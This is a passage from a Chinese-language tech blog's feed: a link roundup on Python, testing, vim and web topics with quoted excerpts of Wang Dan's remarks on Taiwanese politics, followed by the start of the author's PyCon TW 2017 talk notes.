&lt;li&gt;&lt;a href="https://dotblogs.com.tw/hatelove/2017/06/07/agile-and-software-development-recommend-books"&gt;[推坑] 推薦敏捷開發、專案管理、程序員養成、軟體設計 經典書籍 30 本 | In 91 - 點部落&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;大概看過 1/3 而已 QQ  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://pymotw.com/3/zipfile/"&gt;zipfile — ZIP Archive Access — PyMOTW 3&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.pipenv.org/en/latest/"&gt;Pipenv: Sacred Marriage of Pipfile, Pip, &amp;amp; Virtualenv — pipenv 5.1.1 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/toomore/grs"&gt;GitHub - toomore/grs: 📈 台灣上市上櫃股票價格擷取（Fetch Taiwan Stock Exchange data）含即時盤、台灣時間轉換、開休市判斷。&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;grs 台灣上市上櫃股票價格擷取 主要開發擷取台灣股市（TWSE）股價資料 資料來源 證券交易所網站 。 資料來源 證券櫃檯買賣中心 。  版本資訊 Authors: Toomore Chiang Version: 0.7.0 of 2016/09/11 Python Version: Python 2.7 Docs: http://grs-docs.toomore.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/8822335/what-do-the-python-file-extensions-pyc-pyd-pyo-stand-for"&gt;What do the python file extensions, .pyc .pyd .pyo stand for? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;What do these python file extensions mean?  What are the differences between them and how are they generated from a *.py file?  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kennethreitz/pipenv"&gt;kennethreitz/pipenv: Sacred Marriage of Pipfile, Pip, &amp;amp; Virtualenv.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Pipenv harnesses Pipfile, Pip, and Virtualenv together in unison to create a single, high-quality tool that is optimized for workflow efficiency and best practices.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pyvideo.org/pycon-us-2017/whats-new-in-python-36.html"&gt;PyVideo.org ‧ What's new in Python 3.6&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Python 3.6 has turned out to be quite the release! With 16 Python Enhancement Proposals incorporated into the version, Python 3.6 is only surpassed by Python 3.0 for having more PEPs included in a single release.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://engineering.instagram.com/web-service-efficiency-at-instagram-with-python-4976d078e366"&gt;Web Service Efficiency at Instagram with Python – Instagram Engineering&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Instagram currently features the world’s largest deployment of the Django web framework, which is written entirely in Python. We initially chose to use Python because of its reputation for simplicity and practicality, which aligns well with our philosophy of “do the simple thing first.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/python-modernize/python-modernize"&gt;GitHub - python-modernize/python-modernize: Modernizes Python code for eventual Python 3 migration. Built on top of 2to3.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This library is a very thin wrapper around lib2to3 to utilize it to make Python 2 code more modern with the intention of eventually porting it over to Python 3.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;"Speakers: Lisa Guo, Hui DingKeynoteSlides can be found at: https://speakerdeck.com/pycon2017 and https://github.com/PyCon/2017-slides"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/87814/"&gt;Python   Django 如何支撐了 7 億月活用戶的 Instagram？ - Python - 伯樂在線&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;雖然沒有太詳細的細節但仍然是很棒的介紹  &lt;/li&gt;
&lt;li&gt;從 Python 2 轉到 Python 3 效能果然提升了不少  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=66XoCk79kjM"&gt;Lisa Guo, Hui Ding Keynote PyCon 2017 - YouTube&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;testing&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;[Optimize Performance Under Varying Network Conditions  |  Web  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/facebook/augmented-traffic-control"&gt;GitHub - facebook/augmented-traffic-control: Augmented Traffic Control: A tool to simulate network conditions&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://facebook.github.io/augmented-traffic-control/"&gt;ATC - A tool to simulate network conditions&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;vim&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/1269603/to-switch-from-vertical-split-to-horizontal-split-fast-in-vim"&gt;To switch from vertical split to horizontal split fast in Vim - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2017/06/tcp-protocol.html"&gt;TCP 协议简介 - 阮一峰的网络日志&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/web/tools/chrome-devtools/network-performance/reference"&gt;Network Analysis Reference  |  Web  |  Google Developers&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Discover new ways to analyze how your page loads in this comprehensive reference of Chrome DevTools network analysis features.  By default, DevTools records all network requests in the Network panel, so long as DevTools is open.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.cmmedia.com.tw/home/articles/4128"&gt;「告別台灣」 王丹對台灣最後的臨別贈言&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;覺得挺中肯的，以下節錄：  &lt;ol&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;DPP vs. 太陽花  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;王丹認為，民進黨上台以來太自大了，它忘了之所以拿下政權，是太陽花運動起了很大的作用。他提醒民進黨，不要辜負太陽花世代，和他們爭取的價值。「至於國民黨，提都不用提。」他提醒，民進黨對青年世代應該要更謙卑。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;暴力政治vs.民主政治  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;王丹憂心，「台灣很危險的是暴民政治（或暴力政治），我說的是白狼、愛國同心會這類的暴力干預，為什麼政府不處理呢？我認為，至少警政系統有縱容。」他指出，如果大型理性的公共討論一直受暴力干預，對民主政治是非常大的傷害，也會影響整體的公民參與，是個「隱患」。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「台灣人太天真了，怎可以讓黑道治國。為什麼台灣人沒有上街頭去抗議黑道干預政治呢。不要忘了，中共和國民黨就是靠這個起來的！」王丹警惕。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;公民素質vs.民主制度  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;王丹觀察，台灣的公民素質沒有那麼高。而且，台灣人聽不得外人批評。他舉例，每次他在臉書批評，台灣人就留言辯解，甚至說，中國更爛，「我的天啊，你們是要比爛嗎？」他舉例，在大學上課時，有一位中國交換學生說，反對外國干涉中國內政，這時候，有位來自德國的學生站起來說：「我們歡迎世界各國來干涉我們德國內政啊，！這不是可以幫助德國更好嗎！」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他指出，當台灣人批評中國的素質差，但是，他觀察，台灣的公民素質「也沒有高到沒有素質低的狀況」。他舉了數例，比如駕駛人或機車騎士常為一己之便而擅闖行人區或搶快，對他人毫不尊重。「交通問題可以體現台灣公民素質低，台灣真是欠缺。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他重話提醒，「台灣未來政治如果反覆，絕對不是因為制度，而是公民素質的問題。而且，一遇到危機就想回到權威的懷抱，就是民主素養不夠。」他也舉出許多台灣人批評中國人沒有文明，但是自己卻常犯的行為，比如溜狗不撿狗屎、隨處尿尿，前人為後人推門，後人卻沒有說謝的習慣。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「台灣民主2.0，就是提高公民素質。」他直言。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;中國問題vs.兩岸關係  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;很少台灣人關心中國，香港問題。中國如果不民主化，對台灣絕非好事，一定會軍國主義，造成對周邊國家的擴張問題。「這對台灣怎麼會好呢？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;王丹更直言，「台灣政府只看兩岸關係卻不了解中國問題。這是很大的危險。國民黨只了解共產黨。但是，民進黨不只對中國共產黨不了解，對中國都不了解，這才會出現民進黨執政之後一直以為對中國釋放善意，但是中國卻不領情的局面。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;中國民主化vs.台灣  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;中國民主化對台灣的切身利益相關。但是，大多數台灣人卻覺得沒有相關，有著小朝廷的偏安理念。王丹說，這從他推動中國民主化，在台灣沒有籌到多少款可以窺見。他提醒，「台灣應該想辦法推動周邊國家的力量，一起讓中國民主化。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;儘管如此，王丹每年自辦中國沙龍，「台灣人應該去影響在台灣的中國學生，把他變成朋友，你一直罵他，不是多樹立一個敵人嗎？所以，影響在台灣的中國學生就是支持中國民主化。台灣只有放開，不能再那麼狹隘。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;教育是立國之本  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;台灣想再靠經濟再強是難了（意思是，臺灣不能再靠過去威權時代的利益分配來創造經濟奇蹟），即使歐洲國家也做不到。只有中國，美國才能靠經濟強盛。所以，台灣能靠什麼立足東亞？就是教育。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「台灣對教育的投入還不如中國。台灣從社會到政府都太忽視教育了。台灣要亡，會亡在教育。全世界最重要的就是人才，美國就是靠著給獎學金吸引優秀人才來讀，再讓他們讀完留下來工作而強大的。行政院應該拿4800億廣設獎學金，吸引外國人來念書。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他舉例，香港的大學教師薪水是台灣的六倍多，外國學者到北京大學講學的薪水之高，在他看來，給高薪就能請到好的師資，但是，台灣的大學給兼課老師的薪水卻是「要飯的」－東部某大學的兼課教師一年只拿一萬多元－投入的心力與正職老師一樣。他舉例，台灣的某人能辦唐獎，花那麼多錢給國外學者，如果拿這些錢好好做教育，該有多好?他認為，台灣絕對不是沒有錢。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;觀念進步vs.文明社會  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;王丹說，台灣離觀念進步的文明社會還有一段距離。他以同婚爭議為例，「護家盟的人講話都是很奇怪的言論，這些對整個社會真的沒有影響嗎？」他認為，台灣雖然是亞洲第一個開放同婚的國家，但是卻是因大法官釋憲而來，總統卻不表態。他推測，這個社會反對同婚的比率恐怕很大，反映人民對公平、民主的觀念還有待加強。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「我認為反同婚就是反民主。同婚爭取的是同婚後面的平等的地位。台灣接下來很重要工作就是人權。讓每個個人都能被尊重。」王丹說。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;轉型正義的重點是歷史教學  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;王丹的博士論文研究台灣白色恐怖，他在大學教歷史，卻驚訝地發現，很多大學生對台灣歷史欠缺了解，學生都說，高中沒有教。「台灣史應該是通識課，台灣人應該了解台灣的歷史，但是，台灣有教中國史、外國史，卻從來沒有把台灣史或白色恐怖當作通識課。這不是很奇怪嗎？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「這也難怪，民進黨要做轉型正義，但是因為大家都不知道歷史，所以有些人就說民進黨是在報復，是在鬥爭。是這樣嗎？我看，要做轉型正義，等這些受難者都死了，也都沒有人記得了。台灣社會太缺乏歷史記憶了！這是需要靠歷史教學的！」王丹大聲疾呼。他舉例，才不過幾年，就已經沒有多少人知道康寧祥是誰了，怎麼會這樣呢？他喟嘆。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;願為獨立而戰，才可能獨立  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;王丹提醒，獨立不是只是在電視上喊獨立就可以成功的。他曾經看過一份民意調查，年輕人支持台灣獨立的比率很高，但是，願不願意為了獨立而打仗？卻只剩下20%(王丹已經在官網上貼出他引用的台獨民意調查https://www.dcard.tw/f/trending/p/218331327  。看起來，當天他的演講說只剩20%是口誤。願為獨立而戰的人數從2002年22%成長到2015年的32%)。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「世界各國自古以來獨立都是困難的，因為太難了，所以都是打仗解決的。台灣人要有付出代價的心理準備。自保的最好方式是攻擊，而不是防守。如果台灣人能表現出能打的氣勢，就能獨立了。」王丹說。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;立專法－吸引香港人來台工作  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;王丹觀察，中國對香港的民主愈來愈限縮，香港人一定會想辦法移民來台灣。他也觀察，香港的菁英人才的平均工作表現高於台灣人，台灣應該立專法，創設條件吸引香港菁英人才來工作。「台灣對外國人的防禦心理太強，應該要趁機廣納人才。」王丹建議。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="ai"></category><category term="blog"></category><category term="database"></category><category term="deep learning"></category><category term="django"></category><category term="k8s"></category><category term="open source"></category><category term="programmer"></category><category term="python"></category><category term="taiwan"></category><category term="testing"></category><category term="vim"></category><category term="web"></category></entry><entry><title>PyCon TW 2017</title><link href="https://blog.m157q.tw/posts/2017/06/09/pycon-tw-2017/" rel="alternate"></link><published>2017-06-09T17:51:37+08:00</published><updated>2017-06-09T17:51:37+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-06-09:posts/2017/06/09/pycon-tw-2017/</id><summary type="html">&lt;p&gt;Website: &lt;a href="https://tw.pycon.org/2017/en-us/"&gt;https://tw.pycon.org/2017/en-us/&lt;/a&gt;&lt;br /&gt;
Portal: &lt;a href="https://tw.pycon.org/2017/en-us/portal/"&gt;https://tw.pycon.org/2017/en-us/portal/&lt;/a&gt;&lt;br /&gt;
Chat: &lt;a href="https://gitter.im/pycontw/2017"&gt;https://gitter.im/pycontw/2017&lt;/a&gt;&lt;br /&gt;
Collaborative Notes: &lt;a href="https://hackfoldr.org/pycontw2017/"&gt;https://hackfoldr.org/pycontw2017/&lt;/a&gt;&lt;br /&gt;
Quiz Bot: &lt;a href="https://pycontw2017-quizbot.herokuapp.com/"&gt;https://pycontw2017-quizbot.herokuapp.com/&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 1 (2017/06/09)&lt;/h1&gt;
&lt;h2&gt;Keynote: Choices for Smarter AI&lt;/h2&gt;
&lt;p&gt;Speaker: 林軒田  &lt;/p&gt;
&lt;p&gt;有點像是在大學上第 1 堂 AI 概論的感覺，&lt;br /&gt;
前面 30 分鐘基本上沒有啥重點 XD。  &lt;/p&gt;
&lt;p&gt;後面 30 分鐘開始講開始接觸 AI 會面臨哪些 Choices  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Motivation vs Feasibility  &lt;ul&gt;
&lt;li&gt;Motivation  &lt;ul&gt;
&lt;li&gt;something publishable? (maybe just for academia)  &lt;/li&gt;
&lt;li&gt;something profitable?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Feasibility  &lt;ul&gt;
&lt;li&gt;Modeling  &lt;/li&gt;
&lt;li&gt;Timeline  &lt;/li&gt;
&lt;li&gt;Budget  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Big AI problems comes from Big Data  &lt;ul&gt;
&lt;li&gt;generate from motivation  &lt;ul&gt;
&lt;li&gt;variety: dream more in big data age  &lt;/li&gt;
&lt;li&gt;velocity: evolving data, evolving problem  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;generate from feasibility  &lt;ul&gt;
&lt;li&gt;volume: computational bottleneck  &lt;/li&gt;
&lt;li&gt;veracity: modeling with non-textbook data  &lt;ul&gt;
&lt;li&gt;資料的 noise 會比教科書上多很多  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;tip  &lt;ul&gt;
&lt;li&gt;often needing "choose and learn" towards good problems  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Human vs Machine-er Route  &lt;ul&gt;
&lt;li&gt;Human  &lt;/li&gt;
&lt;li&gt;Machine  &lt;ul&gt;
&lt;li&gt;objective criterion  &lt;/li&gt;
&lt;li&gt;use computing power  &lt;/li&gt;
&lt;li&gt;continuous improvement  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to measure AI goal  &lt;ul&gt;
&lt;li&gt;"Computers are useless, they can only give you answers."  &lt;/li&gt;
&lt;li&gt;Spec for Program  &lt;ul&gt;
&lt;li&gt;tip: always start with reasonable, measurable &amp;amp; priortized goals for AI.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What Data to (or not to) Use?  &lt;ul&gt;
&lt;li&gt;Bring Your Own Bottle  &lt;/li&gt;
&lt;li&gt;Design Your ...  &lt;/li&gt;
&lt;li&gt;Choice factors for Data  &lt;ul&gt;
&lt;li&gt;Utility  &lt;/li&gt;
&lt;li&gt;Necessity  &lt;/li&gt;
&lt;li&gt;Quality  &lt;/li&gt;
&lt;li&gt;Cost  &lt;/li&gt;
&lt;li&gt;tip: garbages (data) in, garbages (AI) out. Choose your data.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;More Data Construction  &lt;ul&gt;
&lt;li&gt;不用一開始就要 AI 做事情，最好先用自己的腦袋先做一些 Data Analysis，再讓 AI 幫你完成這些事  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What Model to Start?  &lt;ul&gt;
&lt;li&gt;myth: 即便有大量的資料也不該從最複雜的模型開始  &lt;/li&gt;
&lt;li&gt;Linear (Simpler) Model First  &lt;ul&gt;
&lt;li&gt;Keep It Simple and Stupid  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What Improvements to take  &lt;ul&gt;
&lt;li&gt;Overfitting  &lt;ul&gt;
&lt;li&gt;控制模型的複雜度、做些資料的清理與選擇，讓你的模型可以維持在能夠運作的程度  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Misfitting  &lt;ul&gt;
&lt;li&gt;要 AI 做的好，要確定它在學習的東西是跟你最後的目標有關係  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Over-reusing  &lt;ul&gt;
&lt;li&gt;"If you torture the data long enough, it will confess"  &lt;/li&gt;
&lt;li&gt;當你過度重複處理你的資料，到最後的結果可能是會被汙染的，所以要儘量避免掉這件事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to Verify and Deploy?  &lt;ul&gt;
&lt;li&gt;Code Deployment Workflow  &lt;ul&gt;
&lt;li&gt;Development =&amp;gt; Staging =&amp;gt; Production  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AI Deployment Workflow  &lt;ul&gt;
&lt;li&gt;Offline =&amp;gt; Online =&amp;gt; Production  &lt;ul&gt;
&lt;li&gt;Offline  &lt;ul&gt;
&lt;li&gt;在這個階段常常會跟 Online 的部份有 Misfitting 的問題，所以通常只是做正確的驗證  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Online  &lt;ul&gt;
&lt;li&gt;這時候的 criterion 會跟你的目標比較接近  &lt;/li&gt;
&lt;li&gt;要謹慎選擇跟誰比較，跟太爛的比會太過樂觀，跟太好的比可能會過度調整而產生 Overfitting。  &lt;/li&gt;
&lt;li&gt;Human trust 會比你原本的目標來的重要，因為一個能用的 AI 是需要取的人的信任的，就算你達到目標，如果結果跑出來讓人不滿意的話，一樣達不到效果。要讓人能夠接受這個結果，才能夠發揮這個 AI 的價值。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;跟你的選擇一起學習，時時刻刻要把限制考慮進去，這樣才能夠做出比較好的決策。  &lt;/li&gt;
&lt;li&gt;在訓練 AI 的時候，就像訓練神奇寶貝一樣，會遇到非常多的選擇，而這些選擇也都真的會影響到你訓練出來的 AI 的好壞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;剛剛演講的內容涉及到 Data Engineer 和 Data Scientist 的部份，想請問這兩者的區別？  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;硬要區分的話，Data Scientist 比較偏向設計，而 Data Engineer 比較偏向實作與驗證。但我自己是傾向不去區分，因為最終會需要的能力是跨領域的，所以都要瞭解才是比較好的  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;剛剛提到訓練出來的 AI 要取得人的信任，但這個常常會牽涉到客戶的利益，這該怎麼處理？  &lt;ul&gt;
&lt;li&gt;要確認彼此的期待是合理的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Python 開源軟體考古 - 以 Viper 為例&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: &lt;a href="https://github.com/18z"&gt;陳坤裕 KunYu Chen&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;GitHub repo of this talk: &lt;a href="https://github.com/18z/viper-research"&gt;https://github.com/18z/viper-research&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Viper: &lt;a href="https://github.com/viper-framework/viper"&gt;https://github.com/viper-framework/viper&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Collaborative Note: &lt;a href="https://hackmd.io/s/H1yP4MQye#1050-1120-talk-python-開源軟體考古-以-viper-為例"&gt;https://hackmd.io/s/H1yP4MQye#1050-1120-talk-python-開源軟體考古-以-viper-為例&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;覺得這場講的東西挺不錯的，&lt;br /&gt;
都算是講者自己整理出來的心得，&lt;br /&gt;
介紹了一些可以使用的工具，&lt;br /&gt;
也講了他是怎麼去 trace 以及觀察了哪些東西，&lt;br /&gt;
不失為一個拿來 trace open source project 的方法，&lt;br /&gt;
可能可以幫助自己更容易對於 open source contirbute 做貢獻。  &lt;/p&gt;
&lt;p&gt;可以產生 dependency graph 的工具：&lt;a href="http://furius.ca/snakefood/"&gt;http://furius.ca/snakefood/&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;TenslorFlow Wide &amp;amp; Deep Data Classification the Easy Way&lt;/h2&gt;
&lt;p&gt;Speaker: Yufeng Guo @yufengG&lt;br /&gt;
Slides: &lt;a href="https://www.slideshare.net/YufengGuo4/pycon-tw-tensorflow-wide-deep-data-classification-the-easy-way"&gt;https://www.slideshare.net/YufengGuo4/pycon-tw-tensorflow-wide-deep-data-classification-the-easy-way&lt;/a&gt;&lt;br /&gt;
Code: &lt;a href="https://github.com/amygdala/tensorflow-workshop/tree/master/workshop_sections/wide_n_deep"&gt;https://github.com/amygdala/tensorflow-workshop/tree/master/workshop_sections/wide_n_deep&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;Keynote: The State of Python for Education&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: Carol Willing  &lt;/li&gt;
&lt;li&gt;Collaborative Note: &lt;a href="https://hackfoldr.org/pycontw2017/https%253A%252F%252Fhackmd.io%252Fs%252FHk-NVGXke"&gt;https://hackfoldr.org/pycontw2017/https%253A%252F%252Fhackmd.io%252Fs%252FHk-NVGXke&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;for Education =&amp;gt; X&lt;br /&gt;
for Learning =&amp;gt; O&lt;br /&gt;
&lt;a href="https://github.com/jakevdp/WhirlwindTourOfPython"&gt;https://github.com/jakevdp/WhirlwindTourOfPython&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Learning with Python  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jupyter/notebook"&gt;JupyterNotebook&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jupyterlab/jupyterlab"&gt;JupyterLab&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://pyvideo.org/"&gt;pyvideo&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Creating opportunities  &lt;/li&gt;
&lt;li&gt;Scaling Globally  &lt;/li&gt;
&lt;li&gt;Call to Action  &lt;ul&gt;
&lt;li&gt;Join PSF and Python in Education  &lt;/li&gt;
&lt;li&gt;Participate in a sprint  &lt;/li&gt;
&lt;li&gt;Give a talk or write a post  &lt;/li&gt;
&lt;li&gt;Offer a workshop  &lt;/li&gt;
&lt;li&gt;Contribute to a favorite project  &lt;ul&gt;
&lt;li&gt;Open an issue  &lt;/li&gt;
&lt;li&gt;Fix typo  &lt;/li&gt;
&lt;li&gt;Send pull request  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
